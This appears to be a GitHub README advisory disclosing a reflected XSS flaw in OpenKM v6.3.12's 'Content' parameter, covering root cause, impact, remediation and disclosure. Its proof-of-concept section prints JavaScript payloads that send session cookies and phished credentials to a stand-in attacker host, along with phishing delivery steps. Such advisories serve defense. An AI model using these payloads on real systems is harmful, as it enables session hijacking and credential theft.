# 🛡️ CVE-2026-30502 — Reflected XSS in OpenKM v6.3.12

<div align="center">

![CVE Badge](https://img.shields.io/badge/CVE-2026--30502-high?style=for-the-badge&color=DD6B20&logo=security&logoColor=white)
![OpenKM](https://img.shields.io/badge/Product-OpenKM%20v6.3.12-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Reflected%20XSS-orange?style=for-the-badge)
![Disclosure](https://img.shields.io/badge/Disclosure-Responsible-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Published-brightgreen?style=for-the-badge)

**Discovered & Reported by [Dharmendra Kumar](https://github.com/dharmstm) — Security Researcher**

*Cybersecurity | Penetration Testing | Vulnerability Research | Responsible Disclosure*

</div>

---

## 📌 Table of Contents

- [Overview](#-overview)
- [CVE Details](#-cve-details)
- [Affected Product](#-affected-product)
- [Vulnerability Description](#-vulnerability-description)
- [Root Cause Analysis](#-root-cause-analysis)
- [Impact & Risk Assessment](#-impact--risk-assessment)
- [Proof of Concept (PoC)](#-proof-of-concept-poc)
- [Remediation & Recommendations](#-remediation--recommendations)
- [Disclosure Timeline](#-disclosure-timeline)
- [References](#-references)
- [About the Researcher](#-about-the-researcher)

---

## 🔍 Overview

This repository documents the responsible disclosure of **CVE-2026-30502**, a **Reflected Cross-Site Scripting (XSS)** vulnerability identified in **OpenKM v6.3.12** — a widely deployed open-source document management system used across enterprise and government environments.

The vulnerability exists in the `Content` parameter, which reflects user-supplied input back to the browser without proper sanitization or output encoding. An attacker can craft a malicious URL containing embedded JavaScript and social-engineer a victim into clicking it, resulting in script execution within the victim's browser session.

> ⚠️ **Severity:** Medium–High | **Attack Vector:** Network | **Privileges Required:** None | **User Interaction:** Required

---

## 📋 CVE Details

| Field | Details |
|-------|---------|
| **CVE ID** | CVE-2026-30502 |
| **Product** | OpenKM |
| **Affected Version** | v6.3.12 |
| **Vulnerability Class** | Reflected Cross-Site Scripting (XSS) |
| **Vulnerable Parameter** | `Content` |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N |
| **Severity** | Medium–High |
| **Publisher** | MITRE CVE Program |
| **Researcher** | Dharmendra Kumar |
| **Disclosure Type** | Responsible / Coordinated |

---

## 📦 Affected Product

**OpenKM** is a free and open-source document management system (DMS) providing a web interface for managing, auditing, and distributing business documents. It is used by enterprises, government bodies, and educational institutions worldwide.

- **Product Name:** OpenKM Document Management System
- **Affected Version:** `v6.3.12`
- **Vendor Website:** https://www.openkm.com
- **Category:** Document Management System (DMS)
- **Language / Stack:** Java (JSP / Spring Framework)

---

## 🧨 Vulnerability Description

A **Reflected Cross-Site Scripting (XSS)** vulnerability was identified in OpenKM v6.3.12 via the `Content` parameter. The application fails to validate or encode user-supplied input before reflecting it back in the HTTP response body, allowing arbitrary JavaScript to be injected and executed in the victim's browser.

Unlike Stored XSS, a Reflected XSS payload is not persisted in the database — instead, it rides within a crafted URL. The attack relies on the victim being tricked into clicking a malicious link (delivered via email, social media, or phishing campaigns), after which the payload executes silently in their browser with the victim's session context.

### Attack Flow

```
Attacker crafts malicious URL
        │
        ▼
Victim clicks the link (phishing / social engineering)
        │
        ▼
Browser sends GET/POST request with payload in `Content` parameter
        │
        ▼
OpenKM reflects unsanitized input directly into HTML response
        │
        ▼
Browser parses & executes injected JavaScript
        │
        ▼
Session hijacked / credentials harvested / account compromised
```

---

## 🔬 Root Cause Analysis

The vulnerability results from the application's failure to enforce input-output security controls on the `Content` parameter:

| Weakness | Description |
|----------|-------------|
| ❌ **No Input Validation** | The `Content` parameter accepts raw HTML/JavaScript characters without restriction or filtering |
| ❌ **No Output Encoding** | Reflected values are written into the HTML response without HTML-entity encoding |
| ❌ **Missing CSP Header** | No Content Security Policy is enforced to block inline script execution |
| ❌ **No HTTPOnly Cookies** | Session tokens are accessible via JavaScript, enabling direct cookie theft |

```
User-Crafted URL ──► Content Parameter ──► [NO Validation]
       ──► Reflected in HTML Response ──► [NO Encoding]
              ──► Browser Executes Script ──► Account Compromised
```

---

## 💥 Impact & Risk Assessment

A successful exploitation of this vulnerability can lead to:

| Risk | Description |
|------|-------------|
| 🍪 **Session Hijacking** | Steal active session tokens via `document.cookie` to impersonate the victim |
| 🔑 **Credential Harvesting** | Inject fake login overlays to capture plaintext usernames and passwords |
| 📤 **Information Disclosure** | Exfiltrate sensitive document content, user data, or internal configurations |
| 🎣 **Phishing Attacks** | Serve convincing fake pages hosted within the trusted OpenKM domain |
| 👤 **Account Takeover** | Perform arbitrary authenticated actions on behalf of the victim |
| ⚙️ **Unauthorized Actions** | Modify, delete, or exfiltrate documents within the DMS |
| 🖥️ **Malware Distribution** | Redirect victims to attacker-controlled sites hosting malicious downloads |

---

## 🧪 Proof of Concept (PoC)

> **⚠️ Disclaimer:** The following information is shared strictly for educational and security research purposes under responsible disclosure principles. Do not test or use this against systems you do not own or have explicit written authorization to assess.

### Payload Examples (Generic)

```javascript
// Basic execution proof
<script>alert('CVE-2026-30502 - XSS by Dharmendra Kumar')</script>

// Session cookie exfiltration
<script>document.location='https://attacker.example.com/steal?c='+document.cookie</script>

// Credential phishing overlay
<script>
  var d=document.createElement('div');
  d.innerHTML='<form action="https://attacker.example.com/log" method="POST">'
    +'<input name="u" placeholder="Username"/>'
    +'<input name="p" type="password" placeholder="Password"/>'
    +'<button>Sign In</button></form>';
  document.body.prepend(d);
</script>
```

### Crafted Malicious URL Structure

```
https://target-openkm-instance/[vulnerable-endpoint]?Content=<script>alert(1)</script>
```

### Steps to Reproduce

1. Identify the vulnerable endpoint in OpenKM v6.3.12 that reflects the `Content` parameter
2. Craft a URL appending an XSS payload to the `Content` parameter
3. URL-encode the payload if necessary
4. Send the crafted link to a victim via email, chat, or any social engineering vector
5. When the victim opens the link in their authenticated browser session, the payload executes
6. Observe JavaScript execution, cookie theft, or redirect behavior

---

## 🛠️ Remediation & Recommendations

### For Developers / Vendors

| Recommendation | Implementation |
|---------------|----------------|
| ✅ **Input Validation** | Reject or strip HTML special characters (`<`, `>`, `"`, `'`, `;`) from all user-controlled parameters |
| ✅ **Output Encoding** | Apply context-aware HTML encoding using libraries like OWASP Java Encoder before rendering reflected data |
| ✅ **Content Security Policy** | Deploy a strict CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self'` |
| ✅ **HTTPOnly Cookies** | Set `HttpOnly` and `Secure` flags on all session cookies to block JavaScript access |
| ✅ **Security Libraries** | Integrate OWASP AntiSamy or DOMPurify for robust sanitization |
| ✅ **Upgrade** | Apply the latest vendor-released security patch immediately |

### For System Administrators

- 🔒 Restrict OpenKM access to internal/trusted networks via firewall rules
- 🛡️ Deploy a Web Application Firewall (WAF) with XSS detection signatures as a compensating control
- 📊 Monitor web server access logs for unexpected script tags or encoded payloads in query strings
- 🔄 Keep the OpenKM installation updated to the latest secure release
- 📧 Train users to be cautious about clicking unsolicited links to the DMS

---

## 📅 Disclosure Timeline

| Date | Event |
|------|-------|
| 🔍 **Discovery** | Vulnerability identified during security assessment of OpenKM v6.3.12 |
| 📧 **Vendor Notification** | Responsible disclosure report submitted to OpenKM security team |
| 🤝 **Vendor Acknowledgment** | OpenKM team acknowledged the vulnerability report |
| 📝 **CVE Assignment** | CVE-2026-30502 assigned through the MITRE CVE Program |
| 🌐 **Public Disclosure** | Coordinated public disclosure following remediation period |

> *Full responsible disclosure principles were followed throughout this process, including vendor coordination and CVE Program engagement prior to any public release.*

---

## 📚 References

- 🔗 [MITRE CVE Entry — CVE-2026-30502](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-30502)
- 🔗 [NVD — National Vulnerability Database](https://nvd.nist.gov/)
- 🔗 [OpenKM Official Website](https://www.openkm.com)
- 🔗 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 🔗 [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- 🔗 [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- 🔗 [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)

---

## 👨‍💻 About the Researcher

<div align="center">

### Dharmendra Kumar
**Security Researcher | Penetration Tester | Bug Hunter | CVE Contributor**

</div>

Dharmendra Kumar is an independent cybersecurity researcher specializing in web application security, penetration testing, and responsible vulnerability disclosure. His research focuses on identifying and responsibly reporting real-world security flaws in widely-used software — contributing to safer applications for users globally.

**Areas of Expertise:**
- 🌐 Web Application Penetration Testing
- 🐛 Bug Bounty Hunting & CVE Research
- 🔍 Vulnerability Discovery & Security Advisories
- 📋 Responsible Disclosure & Coordinated CVE Reporting

**Connect with me:**

[![GitHub](https://img.shields.io/badge/GitHub-dharmstm-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dharmstm)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-dharmstm-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/dharmstm)
[![Twitter](https://img.shields.io/badge/Twitter-dharmstm-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/dharmstm)
[![Instagram](https://img.shields.io/badge/Instagram-dharmstm-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/dharmstm)
[![Medium](https://img.shields.io/badge/TryHackMe-dharmstm-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)](https://medium.com/p/dharmstm)

---

## ⚖️ Legal Disclaimer

> This repository is intended **solely for educational and informational purposes**. The vulnerability details and proof-of-concept payloads are published in accordance with responsible disclosure principles. The author does not condone or take responsibility for any unauthorized use of this information. Always obtain **explicit written permission** before conducting security testing on any system you do not own.

---

## 🙏 Acknowledgments

Special thanks to:
- The **OpenKM development team** for their cooperation and responsiveness during coordinated disclosure
- The **MITRE CVE Program** for assigning and managing the CVE identifier
- The global **security research and bug bounty community** for continuously raising the bar on application security

---

<div align="center">

**⭐ If this research helped you, please consider starring this repository.**

*Security research shared openly to make the web safer for everyone.*

*© 2026 Dharmendra Kumar — All Rights Reserved*

</div>
